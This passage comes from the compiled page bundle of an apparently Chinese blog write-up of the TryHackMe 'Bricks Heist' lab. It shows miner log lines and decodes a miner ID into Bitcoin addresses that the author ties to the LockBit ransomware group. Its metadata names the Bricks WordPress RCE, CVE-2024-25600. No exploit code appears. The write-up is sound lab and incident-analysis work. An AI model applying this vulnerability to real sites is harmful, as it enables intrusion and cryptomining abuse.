<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:18,755</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Miner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:20,757</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Miner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>疑似比特币挖矿程序。<br> 对ID进行解码<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex(&#39;None&#39;)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)&amp;input=NTc1NzMxNGU2NTQ3NGU1OTYyNDg0YTRmNjU2ZDc4NzQ1NzU0NGU0MjRlNTc0NjQ4NTU1NDQ2Njg0ZDMwNzA3MzU5MzA2ODRiNjE2YzcwNTU1YTdhNTY2YjUyMzM1Mjc2NTQ2YjY4NmI2NTU3NTI0ODY0N2E1MjVhNTc0NjZmNzc1NDZiNjQzMzRkNmIzNDdhNTI2ZDY4NWE2MjU1MzEzNDU5MzE2ODczNjM2YjM1MzY2MjQ3MzE1YTRkMzA0NTMxNTk1NTY0NDc2MTMwMzU1ODY0NDg2YzYxNTc0NTRhMzU1NzU0NGE1NjRlNDUzOTU5NTU2ZTRhNjg1MjQ2NDk3YTU5MzIzNTUzNjMzMDM5NDg1MjZhNGE2YjUyNDY0YTdhNTQ2ZDcwNmI2NTQ2NmM1MjUwNTQzMDNk" target="_blank" rel="noopener noreferrer">From Hex, From Base64, From Base64 - CyberChef</a><br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250504115516.png" alt="image.png" loading="lazy"><br> 以上地址存在重复部分，选取一部分进行比特币地址检索,<a href="https://explorer.coinex.com/btc/address/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa" target="_blank" rel="noopener noreferrer">BTC地址bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa | CoinEx多币种区块浏览器</a></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250504115700.png" alt="image.png" loading="lazy"><br> 直接搜索地址<code>bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r</code><br> 发现新闻报道，属于名为lockbit的勒索组织。</p>`,42)]))}const r=i(l,[["render",t],["__file","TryHack3M_Bricks Heist.html.vue"]]),d=JSON.parse('{"path":"/article/01_%E9%A1%B9%E7%9B%AE/THM/TryHack3M_Bricks%20Heist.html","title":"TryHack3M_Bricks Heist","lang":"zh-CN","frontmatter":{"icon":"pen-to-square","date":"2025-04-30T00:00:00.000Z","tags":null,"title":"TryHack3M_Bricks Heist","category":["项目"],"description":"前言 本题运用了wordpress漏洞CVE-2024-25600 我们可以提前配置wordscan，WPScan 是一款针对 WordPress 的安全扫描工具，用于检测插件、主题漏洞、用户枚举及配置问题。 漏洞原理 Bricks <= 1.9.6版本，漏洞为远程代码执行 （RCE）， 漏洞存在于Bricks\\\\Query类中，Bricks\\\\Query...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/01_%E9%A1%B9%E7%9B%AE/THM/TryHack3M_Bricks%20Heist.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"TryHack3M_Bricks Heist"}],["meta",{"property":"og:description","content":"前言 本题运用了wordpress漏洞CVE-2024-25600 我们可以提前配置wordscan，WPScan 是一款针对 WordPress 的安全扫描工具，用于检测插件、主题漏洞、用户枚举及配置问题。 漏洞原理 Bricks <= 1.9.6版本，漏洞为远程代码执行 （RCE）， 漏洞存在于Bricks\\\\Query类中，Bricks\\\\Query..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250503124903.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-07-11T14:19:52.000Z"}],["meta",{"property":"article:published_time","content":"2025-04-30T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-07-11T14:19:52.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"TryHack3M_Bricks Heist\\",\\"image\\":[\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250503124903.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250504115516.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250504115700.png\\"],\\"datePublished\\":\\"2025-04-30T00:00:00.000Z\\",\\"dateModified\\":\\"2025-07-11T14:19:52.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"前言","slug":"前言","link":"#前言","children":[{"level":3,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[]}]},{"level":2,"title":"解题过程","slug":"解题过程","link":"#解题过程","children":[]}],"git":{"createdTime":1745992845000,"updatedTime":1752243592000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":241,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":3.66,"words":1097},"filePathRelative":"article/01_项目/THM/TryHack3M_Bricks Heist.md","localizedDate":"2025年4月30日","excerpt":"<h2>前言</h2>\\n<p>本题运用了wordpress漏洞<a href=\\"https://medium.com/@chinamayjoshi/unauthenticated-remote-code-execution-rce-vulnerability-in-bricks-builder-for-wordpress-a12132c91cc1\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\"><strong><em>CVE-2024-25600</em></strong></a><br>\\n我们可以提前配置wordscan，WPScan 是一款针对 WordPress 的安全扫描工具，用于检测插件、主题漏洞、用户枚举及配置问题。</p>","autoDesc":true}');export{r as comp,d as data};
